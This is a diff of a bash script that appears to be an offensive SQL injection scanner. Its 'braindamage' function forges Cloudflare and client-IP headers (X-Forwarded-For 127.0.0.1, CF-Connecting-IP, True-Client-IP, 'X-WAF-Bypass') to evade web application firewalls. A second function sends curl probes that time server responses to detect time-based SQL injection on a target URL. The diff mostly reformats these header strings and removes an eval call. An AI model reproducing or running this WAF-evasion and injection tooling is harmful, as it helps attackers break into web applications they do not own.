@@ -60,27 +60,16 @@ braindamage() {
     local cf_ray=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 16 | head -n 1)
     if [[ "$target_url" == *"?"* ]]; then
         case "$choice" in
-            0) 
-                echo "-H 'Content-Type: application/json' -H 'X-Forwarded-For: 127.0.0.1' -H 'CF-Connecting-IP: 172.67.$((RANDOM % 254 + 1)).$((RANDOM % 254 + 1))' -H 'CF-RAY: ${cf_ray}-CGK'" 
-                ;;
-            1) 
-                echo "-H 'Content-Type: application/json' -H 'CF-Visitor: {\"scheme\":\"https\"}'" 
-                ;;
-            2) 
-                echo "-H 'Content-Type: application/json' -H 'X-WAF-Bypass: True' -H 'CF-IPCountry: US' -H 'True-Client-IP: 103.21.244.$((RANDOM % 254 + 1))'" 
-                ;;
+            0) echo "-H Content-Type:application/json -H X-Forwarded-For:127.0.0.1 -H CF-Connecting-IP:172.67.$((RANDOM % 254 + 1)).$((RANDOM % 254 + 1)) -H CF-RAY:${cf_ray}-CGK" ;;
+1) echo "-H Content-Type:application/json -H CF-Visitor:{\"scheme\":\"https\"}" ;;
+2) echo "-H Content-Type:application/json -H X-WAF-Bypass:True -H CF-IPCountry:US -H True-Client-IP:103.21.244.$((RANDOM % 254 + 1))" ;;
+
         esac
     else
         case "$choice" in
-            0)
-                echo "-H 'Content-Type: application/json' -H 'Authorization: Bearer $cf_ray' -H 'X-WAF-Bypass: True' -H 'CF-IPCountry: US'" 
-                ;;
-            1) 
-                echo "-H 'Content-Type: application/json' -H 'X-Requested-With: XMLHttpRequest' -H 'CF-RAY: ${cf_ray}-CGK' -H 'True-Client-IP: 103.21.244.$((RANDOM % 254 + 1))'" 
-                ;;
-            2)
-                echo "-H 'Content-Type: application/json' -H 'Cache-Control: no-cache, no-store' -H 'Pragma: no-cache' -H 'X-Forwarded-For: 127.0.0.1'" 
-                ;;
+            0) echo "-H Content-Type:application/json -H Authorization:Bearer$cf_ray -H X-WAF-Bypass:True -H CF-IPCountry:US" ;;
+1) echo "-H Content-Type:application/json -H X-Requested-With:XMLHttpRequest -H CF-RAY:${cf_ray}-CGK -H True-Client-IP:103.21.244.$((RANDOM % 254 + 1))" ;;
+2) echo "-H Content-Type:application/json -H Cache-Control:no-cache,no-store -H Pragma:no-cache -H X-Forwarded-For:127.0.0.1" ;;
         esac
     fi
 }
@@ -166,7 +155,7 @@ vector_sqli_agressor_left() {
 
         local waf_trick=$(braindamage)
         echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Vector 1 [Port:$random_port] Probing Latency on: \e[38;5;236m${target_url}${final_query}\e[0m"
-        local curl_output=$(eval "curl $proxy_flag $waf_trick -m 12 -A \"\$random_ua\" -s -o /dev/null -w \"%{time_total}|%{http_code}\" \"\${target_url}\${final_query}\"")
+        local curl_output=$(curl $proxy_flag $waf_trick -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}|%{http_code}" "${target_url}${final_query}")
         local stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
         local http_status=$(echo "$curl_output" | cut -d'|' -f2)
 
